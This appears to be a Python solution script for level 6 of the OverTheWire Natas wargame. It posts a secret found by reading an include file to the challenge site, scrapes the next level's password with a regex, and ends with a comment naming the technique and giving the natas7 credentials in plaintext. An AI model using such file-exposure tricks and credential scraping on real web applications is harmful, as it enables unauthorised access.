from bs4 import BeautifulSoup
import requests
import re

lvl = '6'
next_level = str(int(lvl)+1)
pwd = open(f"./passwords/{'natas'+'0'+lvl if len(lvl)==1 else 'natas'+lvl}.pwd", 'r').read().strip()

url = f'http://natas{lvl}.natas.labs.overthewire.org'
lvl_pass = requests.auth.HTTPBasicAuth(f'natas{lvl}',pwd)

my_params = {'secret':'FOEIUWGHFEEUHOFUOIU', 'submit':'Submit'}

soup = BeautifulSoup(requests.post(url=url,auth=lvl_pass, data=my_params).text, 'html.parser')

pw=re.search(r"[a-zA-Z0-9]{32}",soup.find("div",id="content").text)[0]
open(f"./passwords/{'natas'+'0'+next_level if len(next_level)==1 else 'natas'+next_level}.pwd", 'w').write(pw)
'''

Another directory traversal lesson. Secret is located in includes/secret.inc
# Also apparently you use "data" instead of the "params" kwarg for requests.post.

Username: natas7
Password: jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr

'''
